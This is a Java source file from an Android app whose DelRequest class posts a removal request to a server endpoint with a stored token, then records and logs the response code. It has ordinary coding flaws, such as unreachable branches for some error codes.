package com.inet.android.request;

import java.io.IOException;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import com.inet.android.db.OperationWithRecordInDataBase;
import com.inet.android.db.RequestDataBaseHelper;
import com.inet.android.utils.Logging;

/**
 * DelRequest class is designed to stop the program
 * 
 * @author johny homicide
 * 
 */
public class DelRequest extends DefaultRequest {
	private final String LOG_TAG = DelRequest.class.getSimpleName().toString();
	final private String additionURL = "api/remove";
	private int type = 5;
	static RequestDataBaseHelper db;
	SharedPreferences sp;
	Context ctx;

	public DelRequest(Context ctx) {
		super(ctx);
		this.ctx = ctx;
		sp = PreferenceManager.getDefaultSharedPreferences(ctx);
	}

	@Override
	public void sendRequest(String request) {
		DelTask srt = new DelTask();
		srt.execute(request);
	}

	class DelTask extends AsyncTask<String, Void, Void> {
		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}
	}

	@Override
	protected void sendPostRequest(String request) {
		String str = null;
		if (!request.equals(" ")) {

			try {
				Logging.doLog(LOG_TAG, request, request);
				str = Caller.doMake(request,
						sp.getString("access_first_token", ""), additionURL,
						true, null, ctx);
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		if (str != null) {
			getRequestData(str);
		} else {
			Logging.doLog(LOG_TAG,
					"ответа от сервера нет или статус ответа плох",
					"ответа от сервера нет или статус ответа плох");
			OperationWithRecordInDataBase.insertRecord(null, type, null,
					null, null, ctx);
		}

	}

	@Override
	protected void getRequestData(String response) {
		Logging.doLog(LOG_TAG, "getResponseData: " + response,
				"getResponseData: " + response);

		Editor ed = sp.edit();

		JSONObject jsonObject = null;
		try {
			jsonObject = new JSONObject(response);
		} catch (JSONException e) {
			if (response == null) {
				Logging.doLog(LOG_TAG, "json null", "json null");
			}
			return;
		}

		String str = null;
		try {
			str = jsonObject.getString("code");
		} catch (JSONException e) {
			e.printStackTrace();
		}
		if (str != null) {
			ed.putString("code_del", str);
		} else {
			ed.putString("code_del", "code");
		}

		if (str.equals("1")) {
			Logging.doLog(LOG_TAG, "total annihilation", "total annihilation");
		}
		if (str.equals("0")) {
			String errstr = null;
			try {
				errstr = jsonObject.getString("error");
			} catch (JSONException e) {
				errstr = null;
			}
			if (errstr != null) {
				ed.putString("error_delete", errstr);
			} else {
				ed.putString("error_delete", "");
			}
			if (str.equals("0")) {
				Logging.doLog(LOG_TAG, "incorrect account number",
						"incorrect account number");
				ed.putString("account", "account");
			}
			if (str.equals("3"))
				Logging.doLog(LOG_TAG, "the wrong key", "the wrong key");
			if (str.equals("4"))
				Logging.doLog(LOG_TAG, "wrong mode", "wrong mode");
			if (str.equals("5"))
				Logging.doLog(LOG_TAG, "incorrect account number",
						"incorrect account number");
		}

		ed.commit();
	}

	@Override
	public void sendRequest(int request) {
		// TODO Auto-generated method stub

	}

}
